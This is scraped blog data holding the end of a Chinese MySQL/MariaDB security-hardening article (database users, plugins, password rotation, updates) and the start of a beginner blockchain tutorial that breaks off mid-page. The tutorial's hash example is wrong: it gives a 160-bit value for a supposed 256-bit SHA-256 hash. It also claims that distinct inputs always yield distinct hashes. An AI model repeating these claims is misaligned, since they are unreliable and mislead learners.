class=\"crayon-o\">:</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h1>9. 定义特定应用的数据库用户</h1>\n<p>对于每一个在服务器上运行的应用，只设置一个与该应用相关的数据库用户。例如你有一个 wordpress 网站，如下创建一个 wordpress 的数据库用户：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a334a87e657468029\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# mysql -u root -p\r\nMariaDB [(none)]&gt; CREATE DATABASE osclass_db;\r\nMariaDB [(none)]&gt; CREATE USER 'osclassdmin'@'localhost' IDENTIFIED BY 'osclass@dmin%!2';\r\nMariaDB [(none)]&gt; GRANT ALL PRIVILEGES ON osclass_db.* TO 'osclassdmin'@'localhost';\r\nMariaDB [(none)]&gt; FLUSH PRIVILEGES;\r\nMariaDB [(none)]&gt; exit</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a334a87e657468029-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a334a87e657468029-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a635a334a87e657468029-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a334a87e657468029-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a635a334a87e657468029-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a334a87e657468029-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a334a87e657468029-1\"><span class=\"crayon-p\"># mysql -u root -p</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a334a87e657468029-2\"><span class=\"crayon-i\">MariaDB</span> <span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">none</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">&gt;</span> <span class=\"crayon-i\">CREATE</span> <span class=\"crayon-i\">DATABASE</span> <span class=\"crayon-v\">osclass_db</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a635a334a87e657468029-3\"><span class=\"crayon-i\">MariaDB</span> <span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">none</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">&gt;</span> <span class=\"crayon-i\">CREATE</span> <span class=\"crayon-i\">USER</span> <span class=\"crayon-s\">'osclassdmin'</span><span class=\"crayon-sy\">@</span><span class=\"crayon-s\">'localhost'</span> <span class=\"crayon-i\">IDENTIFIED</span> <span class=\"crayon-i\">BY</span> <span class=\"crayon-s\">'osclass@dmin%!2'</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a334a87e657468029-4\"><span class=\"crayon-i\">MariaDB</span> <span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">none</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">&gt;</span> <span class=\"crayon-i\">GRANT</span> <span class=\"crayon-i\">ALL</span> <span class=\"crayon-i\">PRIVILEGES</span> <span class=\"crayon-i\">ON</span> <span class=\"crayon-v\">osclass_db</span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">*</span> <span class=\"crayon-st\">TO</span> <span class=\"crayon-s\">'osclassdmin'</span><span class=\"crayon-sy\">@</span><span class=\"crayon-s\">'localhost'</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a635a334a87e657468029-5\"><span class=\"crayon-i\">MariaDB</span> <span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">none</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">&gt;</span> <span class=\"crayon-i\">FLUSH</span> <span class=\"crayon-v\">PRIVILEGES</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a334a87e657468029-6\"><span class=\"crayon-i\">MariaDB</span> <span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">none</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">&gt;</span> <span class=\"crayon-v\">exit</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0018 seconds] -->\r\n<p>并且要记住对于不再使用的数据库用户要删掉。</p>\n<h1>10. 使用额外的安全插件和库</h1>\n<p>MySQL 包含许多安全插件：验证客户端连接到 MySQL 服务器的请求、密码校验和敏感信息的安全存储等，这些都在免费版本中提供。</p>\n<p>在这里可查看更多：<a href=\"https://dev.mysql.com/doc/refman/5.7/en/security-plugins.html\" target=\"_blank\" rel=\"nofollow\">https://dev.mysql.com/doc/refman/5.7/en/security-plugins.html</a></p>\n<h1>11. 定期修改 MySQL 密码</h1>\n<p>定期修改密码是一个常见的信息/应用/系统安全建议。多久修改一次密码由你内部的安全策略决定。定期修改密码可以阻止长期跟踪你的“窥探者”，获取你的密码，登录你的 MySQL 服务器。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a334a882759688852\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nMariaDB [(none)]&gt; USE mysql;MariaDB [(none)]&gt; UPDATE user SET password=PASSWORD('YourPasswordHere') WHERE User='root' AND Host = 'localhost';MariaDB [(none)]&gt; FLUSH PRIVILEGES;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a334a882759688852-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a334a882759688852-1\"><span class=\"crayon-i\">MariaDB</span> <span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">none</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">&gt;</span> <span class=\"crayon-st\">USE</span> <span class=\"crayon-v\">mysql</span><span class=\"crayon-sy\">;</span><span class=\"crayon-i\">MariaDB</span> <span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">none</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">&gt;</span> <span class=\"crayon-i\">UPDATE</span> <span class=\"crayon-i\">user</span> <span class=\"crayon-i\">SET</span> <span class=\"crayon-v\">password</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">PASSWORD</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'YourPasswordHere'</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-i\">WHERE</span> <span class=\"crayon-v\">User</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'root'</span> <span class=\"crayon-st\">AND</span> <span class=\"crayon-i\">Host</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-s\">'localhost'</span><span class=\"crayon-sy\">;</span><span class=\"crayon-i\">MariaDB</span> <span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">none</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">&gt;</span> <span class=\"crayon-i\">FLUSH</span> <span class=\"crayon-v\">PRIVILEGES</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p></p>\n<h1>12. 定期更新 MySQL Server 包</h1>\n<p>强烈建议定期从官方仓库更新 mysql/mariadb 包来获取最新的安全更新和错误改进。通常情况下操作系统中默认的包是过时的。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a334a886889292268\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# yum update\r\n# apt update</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a334a886889292268-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a334a886889292268-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a334a886889292268-1\"><span class=\"crayon-p\"># yum update</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a334a886889292268-2\"><span class=\"crayon-p\"># apt update</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>在对 mysql/mariadb server 进行任何修改之后，要重启服务。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a334a889548040448\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# systemctl restart mariadb\t\t#RHEL/CentOS\r\n# systemctl restart mysql\t\t#Debian/Ubuntu</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a334a889548040448-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a334a889548040448-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a334a889548040448-1\"><span class=\"crayon-p\"># systemctl restart mariadb\t\t#RHEL/CentOS</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a334a889548040448-2\"><span class=\"crayon-p\"># systemctl restart mysql\t\t#Debian/Ubuntu</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>分享到此结束，欢迎大家在文章下面评论，并且和我们分享文章中没有提到的安全提示。</p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113422\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113422votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113422\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/d72465e7819b8a9a352bc3cbe4e1a4e31851a59c.jpg"}
{"url_object_id": "7585aea4a928848a1b6aff7fffcd33d9", "title": "区块链入门教程", "url": "http://blog.jobbole.com/113428/", "create_date": "2018/01/04", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/40f9a81cba62930d7bdcff68162b27c0.jpg"], "praise_nums": 2, "comment_nums": 3, "favor_nums": 6, "tags": "IT技术,区块链", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.ruanyifeng.com/blog/2017/12/blockchain-tutorial.html\">阮一峰</a>   </div><div id=\"main-content\">\n<p><!-- div class=\"asset-body\" -->区块链（blockchain）是眼下的大热门，新闻媒体大量报道，宣称它将创造未来。</p>\n<p><!-- /div --> <!-- div id=\"more\" class=\"asset-more\" --></p>\n<p>可是，简单易懂的入门文章却很少。区块链到底是什么，有何特别之处，很少有解释。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/40f9a81cba62930d7bdcff68162b27c0.jpg\" alt=\"\"></p>\n<p>下面，我就来尝试，写一篇最好懂的区块链教程。毕竟它也不是很难的东西，核心概念非常简单，几句话就能说清楚。我希望读完本文，你不仅可以理解区块链，还会明白什么是挖矿、为什么挖矿越来越难等问题。</p>\n<p>需要说明的是，我并非这方面的专家。虽然很早就关注，但是仔细地了解区块链，还是从今年初开始。文中的错误和不准确的地方，欢迎大家指正。</p>\n<h2>一、区块链的本质</h2>\n<p>区块链是什么？一句话，它是一种特殊的分布式数据库。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/2e489c6146b763fb4b6e39aed2409203.png\" alt=\"\"></p>\n<p>首先，区块链的主要作用是储存信息。任何需要保存的信息，都可以写入区块链，也可以从里面读取，所以它是数据库。</p>\n<p>其次，任何人都可以架设服务器，加入区块链网络，成为一个节点。区块链的世界里面，没有中心节点，每个节点都是平等的，都保存着整个数据库。你可以向任何一个节点，写入/读取数据，因为所有节点最后都会同步，保证区块链一致。</p>\n<h2>二、区块链的最大特点</h2>\n<p>分布式数据库并非新发明，市场上早有此类产品。但是，区块链有一个革命性特点。</p>\n<p><strong>区块链没有管理员，它是彻底无中心的。</strong>其他的数据库都有管理员，但是区块链没有。如果有人想对区块链添加审核，也实现不了，因为它的设计目标就是防止出现居于中心地位的管理当局。</p>\n<p>正是因为无法管理，区块链才能做到无法被控制。否则一旦大公司大集团控制了管理权，他们就会控制整个平台，其他使用者就都必须听命于他们了。</p>\n<p>但是，没有了管理员，人人都可以往里面写入数据，怎么才能保证数据是可信的呢？被坏人改了怎么办？请接着往下读，这就是区块链奇妙的地方。</p>\n<h2>三、区块</h2>\n<p>区块链由一个个区块（block）组成。区块很像数据库的记录，每次写入数据，就是创建一个区块。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/58c42848736a08f501c8e777ca2500c5.png\" alt=\"\"></p>\n<p>每个区块包含两个部分。</p>\n<blockquote>\n<ul>\n<li>区块头（Head）：记录当前区块的元信息</li>\n<li>区块体（Body）：实际数据</li>\n</ul>\n</blockquote>\n<p>区块头包含了当前区块的多项元信息。</p>\n<blockquote>\n<ul>\n<li>生成时间</li>\n<li>实际数据（即区块体）的 Hash</li>\n<li>上一个区块的 Hash</li>\n<li>…</li>\n</ul>\n</blockquote>\n<p>这里，你需要理解什么叫 <a href=\"https://baike.baidu.com/item/%E5%93%88%E5%B8%8C%E5%80%BC\">Hash</a>，这是理解区块链必需的。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/090eb817d652e840b3ce66ff3476dab5.png\" alt=\"\"></p>\n<p>所谓 Hash 就是计算机可以对任意内容，计算出一个长度相同的特征值。区块链的 Hash 长度是256位，这就是说，不管原始内容是什么，最后都会计算出一个256位的二进制数字。而且可以保证，只要原始内容不同，对应的 Hash 一定是不同的。</p>\n<p>举例来说，字符串<code>123</code>的 Hash 是<code>a8fdc205a9f19cc1c7507a60c4f01b13d11d7fd0</code>（十六进制），转成二进制就是256位，而且只有<code>123</code>能得到这个 Hash。</p>\n<p>因此，就有两个重要的推论。</p>\n<blockquote>\n<ul>\n<li>推论1：每个区块的 Hash 都是不一样的，可以通过 Hash 标识区块。</li>\n<li>推论2：如果区块的内容变了，它的 Hash 一定会改变。</li>\n</ul>\n</blockquote>\n<h2>四、 Hash 的不可修改性</h2>\n<p>区块与 Hash 是一一对应的，每个区块的 Hash 都是针对”区块头”（Head）计算的。</p>\n<blockquote><p>Hash = SHA256(区块头)</p></blockquote>\n<p>上面就是区块 Hash 的计算公式，Hash 由区块头唯一决定，<code>SHA256</code>是区块链的 Hash 算法。</p>\n<p>前面说过，区块头包含很多内容，其中有当前区块体的 Hash（注意是”区块体”的 Hash，而不是整个区块），还有上一个区块的 Hash。这意味着，如果当前区块的内容变了，或者上一个区块的 Hash 变了，一定会引起当前区块的 Hash 改变。</p>\n<p>这一点对区块链有重大意义。如果有人修改了一个区块，该区块的 Hash 就变了。为了让后面的区块还能连到它，该人必须同时修改后面所有的区块，否则被改掉的区块就脱离区块链了。由于后面要提到的原因，Hash 的计算很耗时，同时修改多个区块几乎不可能发生，除非有人掌握了全网51%以上的计算能力。</p>\n<p>正是通过这种联动机制，区块链保证了自身的可靠性，数据一旦写入，就无法被篡改。这就像历史一样，发生了就是发生了，从此再无法改变。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/902f65004f561616ce8f1bc84975df65.png\" alt=\"\"></p>\n<p>每个区块都连着上一个区块，这也是”区块链”这个名字的由来。</p>\n<h2>五、采矿</h2>\n<p>由于必须保证节点之间的同步，所以新区块的添加速度不能太快。试想一下，你刚刚同步了一个区块，准备基于它生成下一个区块，但这时别的节点又有新区块生成，你不得不放弃做了一半的计算，再次去同步。因为每个区块的后面，只能跟着一个区块，你永远只能在最新区块的后面，生成下一个区块。所以，你别无选择，一听到信号，就必须立刻同步。</p>\n<p>所以，区块链的发明者中本聪（这是假名，真实身份至今未知）故意让添加新区块，变得很困难。他的设计是，平均每10分钟，全网才能生成一个新区块，一小时也就六个。</p>\n<p>这种产出速度不是通过命令达成的，而是故意设置了海量的计算。也就是说，只有通过极其大量的计算，才能得到当前区块的有效 Hash，从而把新区块添加到区块链。由于计算量太大，所以快不起来。</p>\n<p>这个过程就叫做采矿（mining），因为计算有效 Hash 的难度，好比在全世界的沙子里面，找到一粒符合条件的沙子。计算 Hash 的机器就叫做矿机，操作矿机的人就叫做矿工。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/ed0a5783ff70c62bdbab1add89a4c479.jpg\" alt=\"\"></p>\n<h2>六、难度系数</h2>\n<p>读到这里，你可能会有一个疑问，人们都说采矿很难，可是采矿不就是用计算机算出一个 Hash 吗，这正是计算机的强项啊，怎么会变得很难，迟迟算不出来呢？</p>\n<p>原来不是任意一个 Hash 都可以，只有满足条件的 Hash 才会被区块链接受。这个条件特别苛刻，使得绝大部分 Hash 都不满足要求，必须重算。</p>\n<p>原来，区块头包含一个<a href=\"http://www.righto.com/2014/02/bitcoin-mining-hard-way-algorithms.html\">难度系数</a>（difficulty），这个值决定了计算 Hash 的难度。举例来说，<a href=\"https://blockexplorer.com/block/000000000003ba27aa200b1cecaad478d2b00432346c3f1f3986da1afd33e506\">第100000个区块</a>的难度系数是 14484.16236122。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/b3851ad9686bdd85d7c5352e206809c6.png\" alt=\"\"></p>\n<p>区块链协议规定，使用一个常量除以难度系数，可以得到目标值（target）。显然，难度系数越大，目标值就越小。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/a847efd8e55e217d2cc3c25740826f4c.png\" alt=\"\"></p>\n<p>Hash 的有效性跟目标值密切相关，只有小于目标值的 Hash 才是有效的，否则 Hash 无效，必须重算。由于目标值非常小，Hash 小于该值的机会极其渺茫，可能计算10亿次，才算中一次。这就是采矿如此之慢的根本原因。</p>\n<p>区块头里面还有一个 Nonce 值，记录了 Hash 重算的次数。第 100000 个区块的 Nonce 值是<code>274148111</code>，即计算了 2.74 亿次，才得到了一个有效的 Hash，该区块才能加入区块链。</p>\n<h2>七、难度系数的动态调节</h2>\n<p>就算采矿很难，但也没法保证，正好十分钟产出一个区块，有时一分钟就算出来了，有时几个小时可能也没结果。总体来看，随着硬件设备的提升，以及矿机的数量增长，计算速度一定会越来越快。</p>\n<p>为了将产出速率恒定在十分钟，中本聪还设计了难度系数的动态调节机制。他规定，难度系数每两周（2016个区块）调整一次。如果这两周里面，区块的平均生成速度是9分钟，就意味着比法定速度快了10%，因此难度系数就要调高10%；如果平均生成速度是11分钟，就意味着比法定速度慢了10%，因此难度系数就要调低10%。</p>\n<p>难度系数越调越高（目标值越来越小），导致了采矿越来越难。</p>\n<h2>八、区块链的分叉</h2>\n<p>即使区块链是可靠的，现在还有一个问题没有解决：如果两个人同时向区块链写入数据，也就是说，同时有两个区块加入，因为它们都连着前一个区块，就形成了分叉。这时应该采纳哪一个区块呢？</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/3ab5f5cc8511aaa711e0349eabfd198d.png\" alt=\"\"></p>\n<p>现在的规则是，新节点总是采用最长的那条区块链。如果区块链有分叉，将看哪个分支在分叉点后面，先达到6个新区块（称为”六次确认”）。按照10分钟一个区块计算，一小时就可以确认。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/e29e5a6fa98d243b940a3adf89d324d0.png\" 